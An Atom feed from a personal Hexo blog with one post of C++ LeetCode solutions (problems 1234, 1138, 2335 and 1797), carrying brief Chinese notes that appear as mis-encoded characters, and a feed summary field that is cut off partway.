<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jingtianer</title>
  
  <subtitle>A cat coder</subtitle>
  <link href="https://jingtianer.github.io/home/atom.xml" rel="self"/>
  
  <link href="https://jingtianer.github.io/home/"/>
  <updated>2023-02-13T19:47:17.314Z</updated>
  <id>https://jingtianer.github.io/home/</id>
  
  <author>
    <name>Meow Meow Liu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LeetCode-21</title>
    <link href="https://jingtianer.github.io/home/2023/02/13/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9321/"/>
    <id>https://jingtianer.github.io/home/2023/02/13/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9321/</id>
    <published>2023-02-13T03:14:34.000Z</published>
    <updated>2023-02-13T19:47:17.314Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1234-æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²"><a href="#1234-æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²" class="headerlink" title="1234. æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²"></a><a href="https://leetcode.cn/problems/replace-the-substring-for-balanced-string/">1234. æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalance</span><span class="params">(<span class="type">int</span>* count, <span class="type">int</span> avg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count[<span class="string">&#x27;Q&#x27;</span>] &lt;= avg &amp;&amp; count[<span class="string">&#x27;R&#x27;</span>] &lt;= avg &amp;&amp; count[<span class="string">&#x27;E&#x27;</span>] &lt;= avg &amp;&amp; count[<span class="string">&#x27;W&#x27;</span>] &lt;= avg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">balancedString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) &#123;</span><br><span class="line">            count[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> avg = len / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isBalance</span>(count, avg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = len;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>; l &lt; len; l++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (r &lt; len &amp;&amp; !<span class="built_in">isBalance</span>(count, avg)) &#123;</span><br><span class="line">                count[s[r]]--;</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">isBalance</span>(count, avg)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">min</span>(res, r - l);</span><br><span class="line">            count[s[l]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1138-å­—æ¯æ¿ä¸Šçš„è·¯å¾„"><a href="#1138-å­—æ¯æ¿ä¸Šçš„è·¯å¾„" class="headerlink" title="1138. å­—æ¯æ¿ä¸Šçš„è·¯å¾„"></a><a href="https://leetcode.cn/problems/alphabet-board-path/">1138. å­—æ¯æ¿ä¸Šçš„è·¯å¾„</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">alphabetBoardPath</span><span class="params">(string target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : target) &#123;</span><br><span class="line">            <span class="type">int</span> next_x = <span class="built_in">getX</span>(c), next_y = <span class="built_in">getY</span>(c);</span><br><span class="line">            <span class="type">char</span> step_x = <span class="string">&#x27;L&#x27;</span>, step_y = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> diff_x = x - next_x, diff_y = y - next_y;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(next_x &gt; x) &#123;</span><br><span class="line">                step_x = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                diff_x = -diff_x;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(next_y &gt; y) &#123;</span><br><span class="line">                step_y = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">                diff_y = - diff_y;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(next_y == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_x; i++) &#123;</span><br><span class="line">                    res += step_x;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_y; i++) &#123;</span><br><span class="line">                    res += step_y;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_y; i++) &#123;</span><br><span class="line">                    res += step_y;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_x; i++) &#123;</span><br><span class="line">                    res += step_x;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            res += <span class="string">&quot;!&quot;</span>;</span><br><span class="line">            x = next_x;</span><br><span class="line">            y = next_y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (c - <span class="string">&#x27;a&#x27;</span>) % <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (c - <span class="string">&#x27;a&#x27;</span>) / <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœé»˜è®¤å…ˆçºµå‘èµ°ï¼Œå†æ¨ªå‘èµ°ï¼Œé‚£ä¹ˆå½“ä»å¤–éƒ¨åˆ°zæ—¶ï¼Œéœ€è¦å…ˆæ¨ªå‘èµ°å†çºµå‘èµ°<br>å¦‚æœé»˜è®¤å…ˆæ¨ªå‘èµ°ï¼Œå†çºµå‘èµ°ï¼Œé‚£ä¹ˆå½“ä»zåˆ°å¤–éƒ¨æ—¶ï¼Œéœ€è¦å…ˆçºµå‘èµ°å†æ¨ªå‘èµ°</p></blockquote><h2 id="2335-è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿"><a href="#2335-è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿" class="headerlink" title="2335. è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿"></a><a href="https://leetcode.cn/problems/minimum-amount-of-time-to-fill-cups/">2335. è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fillCups</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> x,y;</span><br><span class="line">        <span class="type">int</span> minn = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(amount[<span class="number">0</span>] == <span class="number">0</span> || amount[<span class="number">1</span>] == <span class="number">0</span> || amount[<span class="number">2</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">0</span>] == <span class="number">0</span>) minn = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">1</span>] == <span class="number">0</span>) minn = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">2</span>] == <span class="number">0</span>) minn = <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">1</span>] &lt; amount[minn]) &#123;</span><br><span class="line">                minn = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">2</span>] &lt; amount[minn]) &#123;</span><br><span class="line">                minn = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> a,b;</span><br><span class="line">            <span class="keyword">if</span>(amount[(minn+<span class="number">1</span>)%<span class="number">3</span>] &gt; amount[(minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>]) &#123;</span><br><span class="line">                a = (minn+<span class="number">1</span>)%<span class="number">3</span>;</span><br><span class="line">                b = (minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                b = (minn+<span class="number">1</span>)%<span class="number">3</span>;</span><br><span class="line">                a = (minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += amount[minn];</span><br><span class="line">            <span class="type">int</span> diff = <span class="built_in">min</span>(amount[a] - amount[b], amount[minn]);</span><br><span class="line">            amount[minn] -=  diff;</span><br><span class="line">            amount[a] -= diff;</span><br><span class="line">            amount[a] -= amount[minn]/<span class="number">2</span>;</span><br><span class="line">            amount[b] -= amount[minn] - amount[minn]/<span class="number">2</span>;</span><br><span class="line">            amount[minn] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res += <span class="built_in">max</span>(amount[(minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>], amount[(minn+<span class="number">1</span>)%<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å‡è®¾åˆå§‹çŠ¶æ€ï¼Œä¸‰æ¯æ°´çš„éœ€æ±‚é‡éƒ½å¤§äº0ã€‚é€‰æœ€å°‘çš„ä¸€ç§ï¼Œè®©ä»–å’Œå¦å¤–ä¸¤ç§æ°´ä¸€èµ·æ¥ï¼Œå¹¶ä¸”å°½é‡è®©å¦å¤–ä¸¤æ¯æ°´çš„éœ€æ±‚é‡ç›¸è¿‘ï¼Œå¤„ç†å¥½æœ€å°‘çš„ä¸€ç§åï¼Œæœ€å°‘çš„ä¸€ç§å°±å˜æˆäº†0<br>å¯¹äºå‰©ä¸‹çš„ä¸¤ä¸­æ¸©åº¦ï¼Œæ“ä½œæ•°å°±æ˜¯æœ€å¤§çš„é‚£ä¸ªæ¸©åº¦<br>å¦‚æœåˆå§‹æœ‰ä¸€ä¸ªä¸º0ï¼Œåˆ™å°†minnåˆå§‹åŒ–ä¸ºå¯¹åº”ä¸‹æ ‡<br>ç”±äºåªæœ‰3ä¸ªï¼Œå¯ä»¥å–ä½™å‡å°‘é‡å¤ä»£ç </p></blockquote><h2 id="1797-è®¾è®¡ä¸€ä¸ªéªŒè¯ç³»ç»Ÿ"><a href="#1797-è®¾è®¡ä¸€ä¸ªéªŒè¯ç³»ç»Ÿ" class="headerlink" title="1797. è®¾è®¡ä¸€ä¸ªéªŒè¯ç³»ç»Ÿ"></a><a href="https://leetcode.cn/problems/design-authentication-manager/">1797. è®¾è®¡ä¸€ä¸ªéªŒè¯ç³»ç»Ÿ</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AuthenticationManager</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;string, <span class="type">int</span>&gt; live;</span><br><span class="line">    <span class="type">int</span> timeToLive;</span><br><span class="line">    <span class="built_in">AuthenticationManager</span>(<span class="type">int</span> timeToLive) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;timeToLive = timeToLive;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">generate</span><span class="params">(string tokenId, <span class="type">int</span> currentTime)</span> </span>&#123;</span><br><span class="line">        live[tokenId] = currentTime + timeToLive;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">renew</span><span class="params">(string tokenId, <span class="type">int</span> currentTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!live.<span class="built_in">count</span>(tokenId) || live[tokenId] &lt;= currentTime) <span class="keyword">return</span>;</span><br><span class="line">        live[tokenId] = currentTime + timeToLive;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countUnexpiredTokens</span><span class="params">(<span class="type">int</span> currentTime)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = live.<span class="built_in">begin</span>(); ite != live.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ite-&gt;second &gt; currentTime) count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1234-æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²&quot;&gt;&lt;a href=&quot;#1234-æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²&quot; class=&quot;headerlink&quot; title=&quot;1234. æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/replace-the-substring-for-balanced-string/&quot;&gt;1234. æ›¿æ¢å­ä¸²å¾—åˆ°å¹³è¡¡å­—ç¬¦ä¸²&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;isBalance&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;* count, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; avg)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;Q&amp;#x27;&lt;/span&gt;] &amp;lt;= avg &amp;amp;&amp;amp; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;R&amp;#x27;&lt;/span&gt;] &amp;lt;= avg &amp;amp;&amp;amp; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;E&amp;#x27;&lt;/span&gt;] &amp;lt;= avg &amp;amp;&amp;amp; count[&lt;span class=&quot;string&quot;&gt;&amp;#x27;W&amp;#x27;&lt;/span&gt;] &amp;lt;= avg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;balancedString&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string s)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count[&lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c : s) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count[c]++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = s.&lt;span class=&quot;built_in&quot;&gt;length&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; avg = len / &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;isBalance&lt;/span&gt;(count, avg)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; res = len;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; l = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, r = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; l &amp;lt; len; l++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (r &amp;lt; len &amp;amp;&amp;amp; !&lt;span class=&quot;built_in&quot;&gt;isBalance&lt;/span&gt;(count, avg)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                count[s[r]]--;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                r++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;isBalance&lt;/span&gt;(count, avg)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(res, r - l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            count[s[l]]++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;1138-å­—æ¯æ¿ä¸Šçš„è·¯å¾„&quot;&gt;&lt;a href=&quot;#1138-å­—æ¯æ¿ä¸Šçš„è·¯å¾„&quot; class=&quot;headerlink&quot; title=&quot;1138. å­—æ¯æ¿ä¸Šçš„è·¯å¾„&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/alphabet-board-path/&quot;&gt;1138. å­—æ¯æ¿ä¸Šçš„è·¯å¾„&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span 